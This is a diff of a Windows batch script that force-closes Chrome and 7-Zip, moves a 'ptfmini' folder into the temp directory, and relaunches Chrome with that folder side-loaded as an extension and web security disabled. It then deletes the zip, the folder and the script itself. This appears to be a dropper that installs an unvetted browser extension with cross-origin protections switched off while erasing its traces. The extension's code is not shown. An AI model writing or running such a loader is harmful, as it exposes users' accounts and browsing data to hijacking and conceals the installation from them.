@@ -1,9 +1,10 @@
 @echo off
-set URL=
 
-curl -o "%temp%\download-ptfmini.zip" %URL%
-"C:\Program Files\7-Zip\7z.exe" x "%temp%\download-ptfmini.zip" -o"%temp%" -y
-del "%temp%\download-ptfmini.zip"
+rmdir /S /Q "%temp%\ptfmini"
+move ".\ptfmini" "%temp%"
 taskkill /IM chrome.exe /F
+taskkill /IM 7zFM.exe /F
 start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "--load-extension=%temp%/ptfmini" "--disable-web-security"
+del ".\ptfmini.zip"
+rmdir /S /Q ".\ptfmini"
 del %0
